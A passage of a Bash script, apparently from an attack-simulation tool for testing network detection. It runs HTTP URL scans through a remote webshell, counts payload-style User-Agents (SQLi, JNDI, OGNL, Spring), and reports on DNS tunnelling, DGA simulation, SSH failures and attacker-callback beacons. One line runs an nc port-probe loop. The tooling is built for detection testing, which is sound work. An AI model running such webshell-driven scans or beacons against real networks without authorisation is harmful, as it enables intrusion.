    (( attempted < 1 )) && attempted=$(safe_int "${HTTP_URL_ATTEMPT_COUNT:-${HTTP_REQUESTS_ATTEMPTED:-0}}")
    responses=$(safe_int "$(event_summary_field "${summary}" responses 0)")
    (( responses < 1 )) && responses=$(safe_int "${HTTP_URL_COMPLETE_COUNT:-${WEB_RESPONSES_RECEIVED:-0}}")
    (( attempted > 0 )) && success_rate=$((responses * 100 / attempted))
    msg="HTTP_URL_EXECUTION_SUMMARY attempted=${attempted} responses=${responses} success_rate=${success_rate}%"
    state_append "http_url_scan.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

run_http_url_scan_for_target() {
    local host="$1" port="$2" scheme="$3" out stats_line scheme_out base_url="" transport_ok=false
    local attempted=0 responses=0 connected=0 abnormal_ua=0 rare_ua=0 threat_hunt=0
    local scan_timeout=180 saved_ws_timeout="" curl_req_timeout=2
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    if fast_safe_mode_enabled 2>/dev/null; then
        curl_req_timeout=1
    fi
    scan_timeout=$((HTTP_FOLLOWUP_URLS_PER_HOST * curl_req_timeout + 30))
    (( scan_timeout < 45 )) && scan_timeout=45
    (( scan_timeout > 90 )) && scan_timeout=90
    saved_ws_timeout="${WEBSHELL_LONG_TIMEOUT:-300}"
    WEBSHELL_LONG_TIMEOUT="${scan_timeout}"
    log_message "OK" "HTTP URL scan target: host=${host} port=${port} scheme=${scheme} base_url=${base_url} webshell_timeout=${scan_timeout}s planned_urls=${HTTP_SCAN_UNIQUE_URL_TARGET}" >&2
    local normal_ua=0 payload_ua=0 sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0
    local http_scan_count_failed=0 http_scan_count_success=0 http_scan_count_200=0 http_scan_count_301=0 http_scan_count_302=0 http_scan_count_401=0 http_scan_count_400=0 http_scan_count_403=0 http_scan_count_404=0 http_scan_count_405=0
    local http_scan_count_500=0 http_scan_real_failed=0 http_scan_synthetic_failed=0 http_scan_redirect_count=0 http_scan_timeout_count=0
    local propfind=0 options=0 post=0
    if [[ "${HAS_curl:-false}" == true ]]; then
        local remote_cmd
        remote_cmd=$(build_http_url_scan_curl_remote_cmd "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}")
        printf '%s\n' "${remote_cmd}" > "${LOG_DIR}/http_url_scan_last_cmd_preview.log" 2>/dev/null || true
        out=$(run_webshell_long "http-scan-${scheme}-${host}-${port}" "${remote_cmd}" 2>/dev/null || true)
        transport_ok=true
    elif [[ "${HAS_python3:-false}" == true ]]; then
        out=$(run_remote_python_capture "http-scan-${scheme}-${host}-${port}" \
            "$(build_http_url_scan_python_remote "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}")" 2>/dev/null || true)
        transport_ok=true
    else
        out=$(run_webshell_long "http-tcp-${scheme}-${host}-${port}" \
            "a=0; c=0; for i in \$(seq 1 20); do a=\$((a+1)); nc -z -w2 ${host} ${port} && c=\$((c+1)) || true; done; echo HTTP_BURST_STATS scheme=${scheme} attempted=\$a responses=0 connected=\$c failed=0 success=0 unique_attempted=\$a unique_failed=0 unique_success=0 c200=0 c301=0 c302=0 c401=0 c400=0 c403=0 c404=0 c405=0 c500=0 real_failed=0 synthetic_failed=0 redirect_count=0 timeout_count=0 propfind=0 options=0 post=0 abnormal_ua=0 rare_ua=0 threat_hunt=0 normal_ua=0 payload_ua=0 sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0" \
            2>/dev/null || true)
    fi
    ingest_http_attack_remote_output "${out}" "${host}" "${scheme}" "${port}"
    stats_line=$(parse_http_burst_stats_line "${out}")
    read -r scheme_out attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
        http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
        http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
        propfind options post unique_attempted unique_failed unique_success <<< "${stats_line}"
    sanitize_stats_ints attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
        http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
        http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
        propfind options post unique_attempted unique_failed unique_success
    if [[ -z "${stats_line}" || "${attempted}" -eq 0 ]]; then
        append_http_url_scan_debug "${host}" "${port}" "${scheme}" "${base_url}" "${out}" "http-scan-${scheme}-${host}-${port}"
        log_message "WARN" "HTTP URL scan: no stats for ${scheme}://${host}:${port} (transport_ok=${transport_ok}) — slim retry" >&2
        if [[ "${HAS_curl:-false}" == true ]]; then
            out=$(run_webshell_long "http-scan-retry-${scheme}-${host}-${port}" \
                "$(build_http_url_scan_minimal_retry_cmd "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}")" 2>/dev/null || true)
            ingest_http_attack_remote_output "${out}" "${host}"
            stats_line=$(parse_http_burst_stats_line "${out}")
            read -r scheme_out attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success <<< "${stats_line}"
            sanitize_stats_ints attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success
        fi
        (( attempted < 1 )) && attempted=1
    fi
    WEBSHELL_LONG_TIMEOUT="${saved_ws_timeout}"
    http_sync_url_execution_counters_from_output "${out}"
    http_refresh_sot_from_events || true
    if (( $(safe_int "${HTTP_URL_ATTEMPT_COUNT:-0}") > 0 )); then
        attempted=$(safe_int "${HTTP_URL_ATTEMPT_COUNT}")
        responses=$(safe_int "${HTTP_URL_COMPLETE_COUNT}")
        http_scan_real_failed=$(safe_int "${HTTP_URL_SCAN_REAL_FAILED}")
        http_scan_timeout_count=$(safe_int "${HTTP_URL_SCAN_TIMEOUT_COUNT}")
        unique_attempted="${attempted}"
    fi
    [[ -z "${scheme_out}" ]] && scheme_out="${scheme}"
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s\n' \
        "${scheme_out}" \
        "${attempted}" "${responses}" "${connected}" "${abnormal_ua}" "${rare_ua}" "${threat_hunt}" \
        "${normal_ua}" "${payload_ua}" "${sqli}" "${enc}" "${cmd}" "${trav}" "${jndi}" "${ognl}" "${spring}" \
        "${http_scan_count_failed}" "${http_scan_count_success}" "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" \
        "${http_scan_count_500}" "${http_scan_real_failed}" "${http_scan_synthetic_failed}" "${http_scan_redirect_count}" "${http_scan_timeout_count}" \
        "${propfind}" "${options}" "${post}" \
        "${unique_attempted}" "${unique_failed}" "${unique_success}"
}

lookup_http_burst_target_fields() {
    local host="$1" default_scheme="${2:-http}" default_port="${3:-80}"
    local f line h p s
    for f in reachable_http_targets.txt reachable_https_targets.txt usable_http_targets.txt usable_https_targets.txt http_targets.txt https_targets.txt; do
        [[ -f "${LOCAL_STATE_DIR}/remote_hosts/${f}" ]] || continue
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            if read -r h p s <<< "$(web_target_parse_line "${line}" "${default_scheme}")" && [[ "${h}" == "${host}" ]]; then
                printf '%s %s %s\n' "${h}" "${p}" "${s}"
                return 0
            fi
            if read -r h p s <<< "$(web_target_parse_line "${line}" "https")" && [[ "${h}" == "${host}" ]]; then
                printf '%s %s %s\n' "${h}" "${p}" "${s}"
                return 0
            fi
        done < <(get_local_hosts "${f}" 2>/dev/null | extract_host_file_lines)
    done
    printf '%s %s %s\n' "${host}" "${default_port}" "${default_scheme}"
}

run_http_url_burst_for_host() {
    local host="$1" _req="$2" port scheme
    read -r host port scheme <<< "$(lookup_http_burst_target_fields "${host}")"
    run_http_url_scan_for_target "${host}" "${port}" "${scheme}"
}

format_http_followup_summary_block() {
    cat <<EOF
$(format_intensity_runtime_values_block)

Web Reachability
- HTTP discovered             : ${HTTP_TARGETS_DISCOVERED:-0}
- HTTP reachable              : ${HTTP_TARGETS_REACHABLE:-0}
- HTTP unreachable            : ${HTTP_TARGETS_UNREACHABLE:-0}
- HTTPS discovered            : ${HTTPS_TARGETS_DISCOVERED:-0}
- HTTPS reachable             : ${HTTPS_TARGETS_REACHABLE:-0}
- HTTPS unreachable           : ${HTTPS_TARGETS_UNREACHABLE:-0}
- URL scan selected targets   : ${HTTP_SCAN_TARGET_COUNT:-0}

HTTP/HTTPS URL Scan
- Detection confidence        : ${WEB_DETECTION_CONFIDENCE:-Low}
- planned                     : ${HTTP_REQUESTS_PLANNED:-0}
- attempted                   : ${HTTP_REQUESTS_ATTEMPTED:-0}
- connected                   : ${HTTP_CONNECTED:-0}
- responses (web)             : ${WEB_RESPONSES_RECEIVED:-0}
- HTTP responses              : ${HTTP_RESPONSES_RECEIVED:-0}
- HTTPS responses             : ${HTTPS_RESPONSES_RECEIVED:-0}
- HTTP 400/403/404/405        : ${HTTP_400_COUNT:-0}/${HTTP_403_COUNT:-0}/${HTTP_404_COUNT:-0}/${HTTP_405_COUNT:-0}
- HTTPS 403/404/405           : ${HTTPS_403_COUNT:-0}/${HTTPS_404_COUNT:-0}/${HTTPS_405_COUNT:-0}
- fail ratio                  : ${WEB_FAIL_RATIO:-0}%
- stage status                : ${HTTP_URL_SCAN_STAGE_STATUS:-skipped}

$(format_url_scan_stellar_model_block)

$(format_http_attack_summary_block)

HTTPS URL Scan
- HTTPS responses received  : ${HTTPS_RESPONSES_RECEIVED:-0}
- HTTPS 200/301/302/401     : ${HTTPS_200_COUNT:-0}/${HTTPS_301_COUNT:-0}/${HTTPS_302_COUNT:-0}/${HTTPS_401_COUNT:-0}
- HTTPS 403/404/405         : ${HTTPS_403_COUNT:-0}/${HTTPS_404_COUNT:-0}/${HTTPS_405_COUNT:-0}
- HTTPS failed/success      : ${HTTPS_SCAN_FAILED_RESPONSES:-0}/${HTTPS_SCAN_SUCCESS_RESPONSES:-0}

Combined Web Metrics
- WEB_RESPONSES_RECEIVED    : ${WEB_RESPONSES_RECEIVED:-0}
- WEB_FAILED_RESPONSES      : ${WEB_FAILED_RESPONSES:-0}
- WEB_SUCCESS_RESPONSES     : ${WEB_SUCCESS_RESPONSES:-0}
- WEB_FAIL_RATIO            : ${WEB_FAIL_RATIO:-0}%

Methods & Methods Mix
- PROPFIND count            : ${HTTP_PROPFIND_COUNT:-0}
- POST count                : ${HTTP_POST_COUNT:-0}
- OPTIONS count             : ${HTTP_OPTIONS_COUNT:-0}
- Threat Hunt URL requests  : ${THREAT_HUNT_URL_REQUESTS:-0}

User-Agent Telemetry
- Normal User-Agent count   : ${NORMAL_USER_AGENT_COUNT:-0}
- Rare User-Agent count     : ${RARE_USER_AGENT_COUNT:-0}
- Payload User-Agent count  : ${PAYLOAD_USER_AGENT_COUNT:-0}
- Abnormal User-Agent count : ${ABNORMAL_USER_AGENT_COUNT:-0}
- SQLi-style UA count       : ${UA_SQLI_STYLE_COUNT:-0}
- Traversal-style UA count  : ${UA_TRAVERSAL_STYLE_COUNT:-0}
- Encoding-abuse UA count   : ${UA_ENCODING_ABUSE_COUNT:-0}
- Command-style UA count    : ${UA_COMMAND_STYLE_COUNT:-0}
- JNDI-style UA count       : ${UA_JNDI_STYLE_COUNT:-0}
- OGNL-style UA count       : ${UA_OGNL_STYLE_COUNT:-0}
- Spring-style UA count     : ${UA_SPRING_STYLE_COUNT:-0}

HTTP URL Scan (reachable targets only — recon/suspicious URI patterns)
- Targets                   : reachable_http_targets.txt / reachable_https_targets.txt (IP:PORT)
- Methods                   : GET, HEAD, POST, PROPFIND, OPTIONS
- Wave plan                 : ${HTTP_SCAN_WAVES} waves, unique_url_target=${HTTP_SCAN_UNIQUE_URL_TARGET}, ${HTTP_SCAN_WAVE_SLEEP}s gap
- Follow-up mode            : ${HTTP_FOLLOWUP_MODE}
- Expected HTTP impact      : ${EXPECTED_HTTP_DETECTION_IMPACT}

External Callback (attacker callback / beacon — not URL scan targets)
- Callback base             : ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
- Attacker port             : ${ATTACKER_PORT}
EOF
}

format_http_followup_capability_block() {
    format_unified_telemetry_capability_summary
}

format_unified_telemetry_capability_summary() {
    dep_yes_no() { if [[ "${1:-false}" == true ]]; then printf 'yes'; else printf 'no'; fi; }
    cat <<EOF
Telemetry Capability Matrix
- curl                      : $(dep_yes_no "${HAS_curl:-false}")
- python3                   : $(dep_yes_no "${HAS_python3:-false}")
- ssh                       : $(dep_yes_no "${HAS_ssh:-false}")
- dig                       : $(dep_yes_no "${HAS_dig:-false}")
- smbclient                 : $(dep_yes_no "${HAS_smbclient:-false}")
- nmap                      : $(dep_yes_no "${HAS_nmap:-false}")
- webshell_method           : ${WEBSHELL_METHOD}
- http_followup_mode        : ${HTTP_FOLLOWUP_MODE}

HTTP
- planned                   : ${HTTP_REQUESTS_PLANNED:-0}
- attempted                 : ${HTTP_REQUESTS_ATTEMPTED:-0}
- connected                 : ${HTTP_CONNECTED:-0}
- responses                 : ${HTTP_RESPONSES_RECEIVED:-0}
- HTTP 403 count            : ${HTTP_403_COUNT:-0}
- HTTP 404 count            : ${HTTP_404_COUNT:-0}
- HTTP 405 count            : ${HTTP_405_COUNT:-0}
- HTTP failed responses     : ${HTTP_SCAN_FAILED_RESPONSES:-0}
- HTTP successful responses : ${HTTP_SCAN_SUCCESS_RESPONSES:-0}
- HTTP fail ratio           : ${HTTP_SCAN_FAIL_RATIO:-0}%
- PROPFIND count            : ${HTTP_PROPFIND_COUNT:-0}
- POST count                : ${HTTP_POST_COUNT:-0}
- OPTIONS count             : ${HTTP_OPTIONS_COUNT:-0}

SSH
- planned                   : ${SSH_ATTEMPTS_PLANNED:-0}
- attempted                 : ${SSH_AUTH_ATTEMPTED:-0}
- auth failures observed    : ${SSH_AUTH_FAILURES_OBSERVED:-0}

DNS (enhanced tunnel)
- planned                   : ${DNS_QUERIES_PLANNED:-0}
- attempted                 : ${DNS_QUERIES_ATTEMPTED:-0}
- effective TLD queries     : ${DNS_EFFECTIVE_TLD_COUNT:-0}
- cluster.local queries     : ${DNS_CLUSTER_LOCAL_COUNT:-0}
- powerapps-style queries   : ${DNS_POWERAPPS_STYLE_COUNT:-0}
- suspicious TLD queries    : ${DNS_SUSPICIOUS_TLD_COUNT:-0}
- HTTPS queries             : ${DNS_HTTPS_QUERY_COUNT:-0}
- entropy-style queries     : ${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}
- A / TXT / AAAA            : ${DNS_A_QUERIES:-0} / ${DNS_TXT_QUERIES:-0} / ${DNS_AAAA_QUERIES:-0}

DNS New TLD Test
- enabled                   : ${DNS_NEW_TLD_ENABLED}
- resolver                  : ${DNS_NEW_TLD_RESOLVER:-n/a} (source=${DNS_NEW_TLD_RESOLVER_SOURCE:-unknown})
- tested domains            : ${DNS_NEW_TLD_TESTED_DOMAINS:-0}
- unique TLDs               : ${DNS_NEW_TLD_UNIQUE_TLDS:-0}
- query count               : ${DNS_NEW_TLD_QUERY_COUNT:-0}
- successful / failed       : ${DNS_NEW_TLD_SUCCESSFUL_QUERIES:-0} / ${DNS_NEW_TLD_FAILED_QUERIES:-0}
- detection likelihood      : ${DNS_NEW_TLD_DETECTION_LIKELIHOOD:-LOW}
- stage status              : ${DNS_NEW_TLD_STAGE_STATUS:-skipped}
- expected detection        : dns_new_tld / dns_new_tld_sensor (TA0011 / T1071)

DGA Simulation
- enabled                   : ${DGA_SIMULATION_ENABLED}
- base domain               : ${DGA_BASE_DOMAIN:-xdr.ooo}
- nx_sent / nx_nxdomain     : ${DGA_MODEL_NX_COUNT:-500} / ${DGA_NXDOMAIN_COUNT:-0}
- resolvable_sent / resolved: ${DGA_MODEL_RESOLVABLE_COUNT:-30} / ${DGA_RESOLVED_COUNT:-0}
- stage status              : ${DGA_STAGE_STATUS:-skipped}


External Callback
- attempted                 : ${EXTERNAL_CALLBACK_ATTEMPTED:-0}
- connected                 : ${EXTERNAL_CALLBACK_CONNECTED:-0}
- responses                 : ${EXTERNAL_CALLBACK_RESPONSES:-0}
- beacon cycles             : ${CORRELATION_BEACON_CYCLES:-0}

Internal Web Fanout
- attempted                 : ${INTERNAL_FANOUT_ATTEMPTED:-0}
- connected                 : ${INTERNAL_FANOUT_CONNECTED:-0}
- responses                 : ${INTERNAL_FANOUT_RESPONSES:-0}
- JNDI-style UA (fanout)    : ${FANOUT_UA_JNDI_STYLE_COUNT:-0}
- OGNL-style UA (fanout)    : ${FANOUT_UA_OGNL_STYLE_COUNT:-0}
- Spring-style UA (fanout)  : ${FANOUT_UA_SPRING_STYLE_COUNT:-0}

Non-standard Port
- connections               : ${NONSTANDARD_PORT_CONNECTIONS:-0}
EOF
}

record_discovered_services_snapshot() {
    local f content lines reason cache
    for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        if [[ -s "${cache}" ]]; then
            content=$(awk '/^[0-9]+\./ {print $1}' "${cache}")
        else
            content=$(get_local_hosts "${f}" 2>/dev/null || true)
        fi
        lines=$(count_discovered_ips_in_file "${cache}")
        if [[ "${lines}" == 0 && -n "${content}" ]]; then
            lines=$(safe_int "$(count_hosts_blob "${content}")")
        fi
        if (( lines == 0 )); then
            reason="no open port mapped to ${f} during discovery (nmap/fallback/probe)"
        else
            reason="ok"
        fi
        state_append "discovered_service_files.log" "${f}: count=${lines} status=${reason}"
        if [[ "${VERBOSE}" == true || "${DRY_RUN}" == true ]]; then
            vlog "Discovery file ${f} (${lines}): $(printf '%s' "${content}" | tr '\n' ' ')"
        fi
        if [[ -n "${REPORT_MD}" && "${DRY_RUN}" != true ]]; then
            safe_append_file "${REPORT_MD}" "### Discovered: ${f} (${lines})
\`\`\`
${content:-<empty>}
\`\`\`
" 2>/dev/null || true
        fi
    done
    count_all_discovered_services >/dev/null
}

followup_record_http() {
    local n="${1:-1}"
    FOLLOWUP_HTTP_REQUESTS=$((FOLLOWUP_HTTP_REQUESTS + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_http_count.log" "${n}"
}

followup_record_ssh() {
    local n="${1:-1}"
    FOLLOWUP_SSH_AUTH_FAILURES=$((FOLLOWUP_SSH_AUTH_FAILURES + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_ssh_count.log" "${n}"
}

followup_record_smb() {
    local n="${1:-1}"
    FOLLOWUP_SMB_PROBES=$((FOLLOWUP_SMB_PROBES + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_smb_count.log" "${n}"
}

followup_record_dns() {
    local n="${1:-1}"
    FOLLOWUP_DNS_QUERIES=$((FOLLOWUP_DNS_QUERIES + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_dns_count.log" "${n}"
}

count_all_discovered_services() {
    local total=0 f n cache
    for f in ssh_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt dns_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        if [[ -s "${cache}" ]]; then
            n=$(count_discovered_ips_in_file "${cache}")
        else
            n=$(safe_int "$(count_remote_target_file "${f}")")
        fi
        total=$((total + n))
    done
    SERVICES_DISCOVERED_TOTAL="${total}"
    echo "${total}"
}

collect_http_followup_targets() {
    local kind="$1" raw_file usable_file cache usable_cache merged=""
    case "${kind}" in
        http) raw_file="http_targets.txt"; usable_file="usable_http_targets.txt" ;;
        https) raw_file="https_targets.txt"; usable_file="usable_https_targets.txt" ;;
        *) return 0 ;;
    esac
    cache="${LOCAL_STATE_DIR}/remote_hosts/${raw_file}"
    usable_cache="${LOCAL_STATE_DIR}/remote_hosts/${usable_file}"
    if [[ -s "${cache}" ]]; then
        merged=$(awk '/^[0-9]+\./ {print $1}' "${cache}")
    fi
    if [[ -s "${usable_cache}" ]]; then
        merged=$(printf '%s\n%s' "${merged}" "$(awk '/^[0-9]+\./ {print $1}' "${usable_cache}")")
    fi
    if [[ -z "${merged}" ]]; then
        merged=$(get_followup_hosts "${raw_file}")
    fi
    printf '%s\n' "${merged}"
}

collect_http_followup_targets_unique() {
    collect_http_followup_targets "$1" | awk '/^[0-9]+\./ {print $1}' | sort -u
}

# --- HTTP URL Scan (response-code focused, reachable targets only) ---
followup_stage_http() {
    if fast_safe_mode_enabled 2>/dev/null && [[ "${FAST_SAFE_SKIP_HTTP_WORKER:-false}" == true ]]; then
        add_executed_stage "HTTP/HTTPS Follow-up"
        set_stage_result "HTTP/HTTPS Follow-up" "Skipped" "fast-safe fail-fast: no reachable HTTP/HTTPS"
        log_message "WARN" "FAST_SAFE_FAIL_FAST module=http reachable_http=0 reachable_https=0"
        return 0
    fi
    local scan_targets candidates host port scheme target_line scan_stats scheme_out http_stage_status="Success" http_stage_detail=""
    local main_host="" main_port="" main_scheme=""
    local attempted_total=0 connected_total=0 abnormal_total=0 rare_total=0 threat_total=0
    local normal_total=0 payload_total=0 sqli_total=0 enc_total=0 cmd_total=0 trav_total=0 jndi_total=0 ognl_total=0 spring_total=0
    local propfind_total=0 options_total=0 post_total=0
    local scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring
    local http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 propfind options post
    local http_scan_count_500=0 http_scan_count_timeout=0 http_scan_fail_ratio=0
    local unique_attempted unique_failed unique_success
    local unique_attempted_total=0 unique_failed_total=0 unique_success_total=0
    local main_total=0 main_failed=0 main_success=0 main_fail_ratio=0 main_400=0 main_403=0 main_404=0 main_timeout=0
    local main_burst_elapsed=0

    if [[ ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_http_targets.txt" && ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_https_targets.txt" ]]; then
        stage_validate_web_reachability || true
    fi

    poc_obs_stage_start "HTTP Follow-up"
    add_executed_stage "HTTP/HTTPS Follow-up"
    http_sot_init_run
    resolve_http_followup_mode
    resolve_http_scan_wave_plan
    HTTP_URL_GEN_COUNT="${HTTP_FOLLOWUP_URLS_PER_HOST}"
    log_message "OK" "HTTP_URL_GENERATED generated=${HTTP_URL_GEN_COUNT} profile=detection_followup_fixed_paths hosts_max=${HTTP_FOLLOWUP_MAX_HOSTS}" >&2
    state_append "http_url_scan.log" "HTTP_URL_GENERATED generated=${HTTP_URL_GEN_COUNT} profile=detection_followup_fixed_paths hosts_max=${HTTP_FOLLOWUP_MAX_HOSTS}"
    write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "start" "response-code scan intensity=${FOLLOWUP_INTENSITY} mode=${HTTP_FOLLOWUP_MODE}"

    candidates=$(collect_http_url_scan_candidates)
    if fast_safe_mode_enabled 2>/dev/null; then
        log_message "OK" "HTTP_URL_SCAN_SOURCE source=service_discovery_reachable_only candidates=$(printf '%s\n' "${candidates}" | awk 'NF{c++} END{print c+0}')"
    elif [[ -z "${candidates}" ]]; then
        candidates=$(collect_http_url_scan_candidates_from_reachable)
        log_message "OK" "HTTP_URL_SCAN_SOURCE source=${HTTP_URL_SCAN_SOURCE:-reachable_http} action=retry_from_reachable"
    fi
    scan_targets=$(select_http_followup_targets "${candidates}")
    if [[ -n "${scan_targets}" ]]; then
        read -r main_host main_port main_scheme <<< "$(printf '%s\n' "${scan_targets}" | awk 'NF {print; exit}')"
    else
        main_host="" main_port="" main_scheme=""
    fi
    HTTP_REQUESTS_PLANNED="${HTTP_FOLLOWUP_PLANNED_REQUESTS}"
    HTTP_REQUESTS_ATTEMPTED=0
    URL_SCAN_UNIQUE_ATTEMPTED=0
    URL_SCAN_UNIQUE_FAILED=0
    URL_SCAN_UNIQUE_SUCCESS=0
    URL_SCAN_UNIQUE_FAIL_RATIO=0
    URL_SCAN_ANOMALY_SCORE=0
    HTTP_CONNECTED=0
    HTTP_RESPONSES_RECEIVED=0
    HTTPS_RESPONSES_RECEIVED=0
    HTTPS_CONNECTED=0
    HTTPS_REQUESTS_ATTEMPTED=0
    ABNORMAL_USER_AGENT_COUNT=0
    RARE_USER_AGENT_COUNT=0
    NORMAL_USER_AGENT_COUNT=0
    PAYLOAD_USER_AGENT_COUNT=0
    UA_SQLI_STYLE_COUNT=0
    UA_ENCODING_ABUSE_COUNT=0
    UA_COMMAND_STYLE_COUNT=0
    UA_TRAVERSAL_STYLE_COUNT=0
    UA_JNDI_STYLE_COUNT=0
    UA_OGNL_STYLE_COUNT=0
    UA_SPRING_STYLE_COUNT=0
    THREAT_HUNT_URL_REQUESTS=0
    HTTP_200_COUNT=0 HTTP_301_COUNT=0 HTTP_302_COUNT=0 HTTP_401_COUNT=0
    HTTP_400_COUNT=0 HTTP_403_COUNT=0 HTTP_404_COUNT=0 HTTP_405_COUNT=0
    HTTPS_400_COUNT=0
    HTTPS_200_COUNT=0 HTTPS_301_COUNT=0 HTTPS_302_COUNT=0 HTTPS_401_COUNT=0
    HTTPS_403_COUNT=0 HTTPS_404_COUNT=0 HTTPS_405_COUNT=0
    HTTP_SCAN_FAILED_RESPONSES=0 HTTP_SCAN_SUCCESS_RESPONSES=0
    HTTPS_SCAN_FAILED_RESPONSES=0 HTTPS_SCAN_SUCCESS_RESPONSES=0
    HTTP_PROPFIND_COUNT=0 HTTP_OPTIONS_COUNT=0 HTTP_POST_COUNT=0
    reset_http_attack_metrics
    log_http_ua_policy_local url_scan

    if (( HTTP_SCAN_TARGET_COUNT > 0 )); then
        log_http_detection_window_bundle "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "0" plan
    fi

    log_message "OK" "HTTP Follow-up planning (detection traffic profile):
    HTTP discovered=${HTTP_TARGETS_DISCOVERED:-0} HTTP reachable=${HTTP_TARGETS_REACHABLE:-0}
    discovered_hosts=${HTTP_FOLLOWUP_DISCOVERED_HOSTS:-0} selected_hosts=${HTTP_FOLLOWUP_SELECTED_HOSTS:-0}
    urls_per_host=${HTTP_FOLLOWUP_URLS_PER_HOST:-10} planned_requests=${HTTP_FOLLOWUP_PLANNED_REQUESTS:-0} (cap=${HTTP_FOLLOWUP_MAX_REQUESTS:-20})
    primary_target=${HTTP_URL_SCAN_SELECTED_TARGET:-none}
    fixed_paths=$(http_followup_fixed_paths_csv)
    degraded_fallback=${URL_SCAN_DEGRADED_FALLBACK:-false}"
    [[ "${URL_SCAN_DEGRADED_FALLBACK}" == true ]] && \
        log_message "WARN" "URL Scan using degraded fallback targets"

    if (( HTTP_SCAN_TARGET_COUNT == 0 )); then
        HTTP_URL_SCAN_STAGE_STATUS="skipped"
        poc_obs_record_followup "HTTP URL Scan" "n/a" "0" "not_found" "http" "n/a" "0" "no reachable HTTP/HTTPS targets" \
            "unknown" false false "" "0" "0" || true
        log_message "WARN" "URL Scan skipped: no reachable HTTP/HTTPS targets (decision=skipped_config_missing)"
        set_stage_result "HTTP/HTTPS Follow-up" "Skipped" "no reachable HTTP/HTTPS targets"
        write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "skipped" "no reachable targets"
        save_http_url_scan_overlap_result
        return 0
    fi

    state_append "followup_http_planned.log" "discovered_hosts=${HTTP_FOLLOWUP_DISCOVERED_HOSTS:-0} selected_hosts=${HTTP_FOLLOWUP_SELECTED_HOSTS:-0} planned_requests=${HTTP_FOLLOWUP_PLANNED_REQUESTS:-0} primary=${HTTP_URL_SCAN_SELECTED_TARGET:-none} mode=${HTTP_FOLLOWUP_MODE}"

    if [[ "${DRY_RUN}" == true ]]; then
        local http_idx=0
        http_total=$(printf '%s\n' "${scan_targets}" | awk 'NF{c++} END{print c+0}')
        while IFS= read -r target_line; do
            [[ -z "${target_line}" ]] && continue
            read -r host port scheme <<< "${target_line}"
            read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
            http_idx=$((http_idx + 1))
            poc_obs_log "INFO" "HTTP Follow-up Progress: ${http_idx}/${http_total} targets processed"
            precheck_line=$(poc_precheck_http "${scheme}://${host}:${port}/")
